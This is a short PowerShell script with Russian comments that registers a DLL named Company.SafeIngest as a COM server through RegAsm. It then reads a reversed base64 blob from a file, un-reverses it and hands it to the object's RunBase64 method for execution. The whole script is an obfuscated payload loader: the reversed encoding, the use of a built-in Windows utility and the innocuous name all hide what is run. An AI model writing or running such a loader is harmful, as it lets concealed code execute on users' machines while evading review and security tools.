﻿$RegAsm = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
& $RegAsm .\Company.SafeIngest.dll /codebase
# читаем и разворачиваем base64
$revBase64 = Get-Content -Raw -Path "base64.txt"
$chars = $revBase64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars

# создаём COM объект
$com = New-Object -ComObject Company.SafeIngest

# запуск
$com.RunBase64($fixedBase64)
